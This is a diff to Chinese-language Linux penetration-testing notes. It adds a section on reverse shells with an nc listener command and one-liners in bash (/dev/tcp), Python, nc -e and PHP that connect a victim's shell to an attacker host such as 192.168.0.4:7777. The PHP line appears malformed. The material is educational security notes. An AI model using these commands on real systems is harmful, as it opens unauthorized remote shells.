@@ -1,5 +1,6 @@
 - [基础概念](#基础概念)
 - [基础信息收集](#基础信息收集)
+- [反弹shell](#反弹shell)
 - [提权操作](#提权操作)
   - [SUID提权](#suid提权)
     - [利用find命令提权](#利用find命令提权)
@@ -29,7 +30,23 @@
 
 # 基础信息收集
 
+# 反弹shell
+反弹shell指在自己的机器上**开启监听**(nc -lvp 7777)，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上
 
+- kali端命令：
+  - 开启监听:`nc -lvp 7777`
+- 受控端连接：
+  - 直接利用bash: `bash -i >& /dev/tcp/ip/port 0>&1`
+    - **bash -i** 表示在本地打开一个bash
+    - **\>&** 表示将标准输出重定向到后面的文件
+    - **/dev/tcp/ip/port**  /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，>&后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出
+  
+  - 利用python: `python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"`
+    - 首先建立socket连接
+    - 然后利用os.dup2将标准输入(0)、标准输出(1)、标准错误输出(2)定位到远程
+    - 
+  - 利用nc: `nc -e /bin/bash 192.168.0.4 7777`
+  - 利用php: `php- 'exec("/bin/bash -i >& /dev/tcp/192.168.0.4/7777")'`
 
 # 提权操作
 提权思路：通过信息搜集查找可利用的文件/脚本/软件/用户/内核漏洞/恶意劫持/特定平台漏洞/框架漏洞/组件/等，写入或执行恶意命令/脚本/shell/添加高权限用户，提权成功，然后进一步利用。
